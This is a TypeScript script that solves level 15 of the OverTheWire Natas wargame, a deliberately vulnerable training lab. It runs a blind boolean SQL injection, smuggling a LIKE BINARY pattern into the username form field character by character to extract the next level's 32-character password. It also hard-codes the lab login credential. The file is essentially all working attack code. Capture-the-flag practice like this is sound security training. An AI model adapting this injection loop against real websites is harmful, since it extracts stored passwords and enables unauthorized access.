const rp = require('request-promise');
import * as http from "http"
const keepAliveAgent = new http.Agent({
	keepAlive: true,
	maxSockets:  40 
});

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
let password: any[] = [];
for(let j = 0; j < 32; j++){
	password.push("#");
}

for(let k = 0; k < 32; k++){
	let promiseArray: Promise<string>[] = [];
	for (let i = 0; i < chars.length; i++){
		let baseQuery = `natas16" and password like BINARY "`;
		for(let j = 0; j < k; j++){
			baseQuery += `_`;
		}
		baseQuery += `${chars[i]}%`;
		let promise = rp.post('http://natas15.natas.labs.overthewire.org/index.php?debug=1', {
			form : {
				username : baseQuery
			},
			pool: keepAliveAgent
		})
			.auth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J', true)
		promiseArray.push(promise);
		baseQuery = "";
	}
	Promise.all(promiseArray)
		.then((responses: string[]) => {
			for (let i = 0; i < responses.length; i += 1){
				if (responses[i].includes('exists') == true){
					password[k] = chars[i];
				}
			}
		})
		.catch(console.error);
}
process.on('exit', function() {
	console.log(password.join(''));
	keepAliveAgent.destroy();
	console.log("Goodbye!");
})

